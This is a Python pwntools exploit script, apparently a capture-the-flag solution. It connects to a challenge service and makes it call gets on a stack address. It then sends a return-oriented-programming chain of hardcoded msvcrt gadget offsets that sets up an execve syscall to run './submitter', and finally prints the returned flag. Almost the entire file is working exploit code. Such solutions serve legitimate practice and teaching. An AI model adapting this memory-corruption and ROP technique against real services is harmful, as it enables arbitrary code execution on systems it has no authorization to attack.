import argparse

from pwn import *

context.terminal = ['tmux', 'splitw', '-v']
context.log_level = 'debug'
context.arch='amd64'


# PATH = "/handout/challenge"
# LIBC = "/handout/libc.so.6"
# LD = "/handout/ld-linux-x86-64.so.2"
# e = ELF(PATH)
# libc = ELF(LIBC)

network = len(sys.argv) > 1

if network:
    parser = argparse.ArgumentParser()
    default_addr = os.environ.get("HOST", "127.0.0.1") + ":" + os.environ.get("PORT", "31337")
    parser.add_argument("--network", action='store_true')
    parser.add_argument("address", default=default_addr,
                        nargs="?", help="Address of challenge")
    args = parser.parse_args()
    HOST, PORT = args.address.split(':')

    r = remote(HOST, int(PORT))
else:
    r = process(PATH)
#    r = gdb.debug(PATH, f'''
#file {PATH}
#break *main+0x253
#c
#c
#c
#c
#''')


# r.sendlineafter(b"Which module would you like to load?\r\n", b"msvcrt")
# r.recvuntil(b"Module handle: ")
# msvcrt = int(r.recvuntil(b"\r\n"), 16)
# r.sendlineafter(b"What function do you want to call?\r\n", b"printf")
# r.sendlineafter(b"What value do you want for the first argument?\r\n", f"{msvcrt + 0x07485c}")
# r.recvuntil(b"Alright, we're calling it!\r\n")
# output = r.recvuntil(b"Result: ")[:-8]
# r.recvuntil(b"\r\n")

# print(output)

# pointers = [int(a, 16) for a in output[1:-4].split(b",")]

# print(f"{[hex(p) for p in pointers]}")


msvcrt_base = 0x000000007bb50000 # static?

r.sendlineafter(b"Which module would you like to load?\r\n", b"msvcrt")
r.recvuntil(b"Module handle: ")
msvcrt = int(r.recvuntil(b"\r\n"), 16)
r.sendlineafter(b"What function do you want to call?\r\n", b"gets")
r.sendlineafter(b"What value do you want for the first argument?\r\n", f"{0x7ffffe2ffe70}".encode())
r.recvuntil(b"Alright, we're calling it!\r\n")

time.sleep(1)
r.sendline(b"".join([p64(p) for p in [
    0, # rbp
    msvcrt_base + 0xad1b, # pop rax ; retn 
    0x7ffffe2ffe00, # dummy rax
    msvcrt_base + 0x2dbbd, # pop rdx ; ror byte [rax-0x7d], 0xc4 ; retn 
    0, # rdx
    msvcrt_base + 0xad1b, # pop rax ; retn 
    0x3b, # rax
    msvcrt_base + 0x157ba, # pop rdi ; retn 
    0x7ffffe2ffed0, # rdi -> filename
    msvcrt_base + 0xd466, # pop rsi ; retn 
    0, # rsi
    msvcrt_base + 0x13e4b, # syscall 
]]) + b"./submitter\x00")

time.sleep(1)

r.sendline(b"")

time.sleep(1)

# r.sendline(b"./submitter")
r.recvuntil(b"Flag: ")
print(r.recvuntil(b"\n").decode(), end='')


# r.interactive()